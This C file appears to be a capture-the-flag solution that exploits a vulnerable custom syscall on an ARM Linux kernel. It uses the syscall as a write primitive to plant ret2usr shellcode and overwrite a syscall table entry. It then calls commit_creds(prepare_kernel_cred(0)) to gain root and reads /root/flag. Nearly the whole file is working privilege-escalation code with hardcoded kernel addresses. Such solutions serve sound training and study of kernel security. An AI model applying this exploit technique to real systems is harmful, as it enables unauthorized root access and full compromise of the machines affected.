// Consulted https://blog.overninethousand.de/syscall-write-up/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

// from /proc/kallsyms
// 8003f56c T commit_creds
// 8003f924 T prepare_kernel_cred

struct cred;
struct task_struct;

typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon)
  __attribute__((regparm(3)));
typedef int (*commit_creds_t)(struct cred *new)
  __attribute__((regparm(3)));

prepare_kernel_cred_t prepare_kernel_cred;
commit_creds_t commit_creds;


#define SYS_CALL_TABLE      0x8000e348      // manually configure this address!!
#define SYS_UPPER 223

void get_root(){
    commit_creds(prepare_kernel_cred(0));  
}

int main(){
    // Set up kernel calls
    prepare_kernel_cred = (void*)0x8003f924;
    commit_creds = (void*)0x8003f56c;

    //ret2usr shellcode, just jumps to r0 (first arg)
    printf("UID is %d\n", getuid());

    char *shellcode = "\xf0\x4f\x2d\xe9\x30\xff"  
                      "\x2f\xe1\xf0\x4f\xbd\xe8"
                      "\x1e\xff\x2f\xe1";    
    
    void *target = (void*) 0x82ffbabe;  
    syscall(SYS_UPPER, shellcode, target);  // write shellcode at target

    //0x8000e6c4 = SYS_CALL_TABLE+223*sizeof(void*)
    void* sysupper_addr = (void*) 0x8000e6c4;

    char target_addr[] = "\xbe\xba\xff\x82";
    syscall(SYS_UPPER, target_addr, sysupper_addr); // write shellcode addr at syscall addr

    // call shellcode with get_root as first arg
    syscall(SYS_UPPER, get_root);

    // Check that we're root!
     printf("UID now %d\n", getuid());

    char flag[128];
    FILE * fp = fopen("/root/flag","r");
  
    if( fp == NULL )
    {
       perror("[-] Error while opening the flag file\n");
       return -1;
    }
 
    fgets(flag, 128, fp);
    printf("[+] Flag: %s", flag);
  
    fclose(fp);
    
}
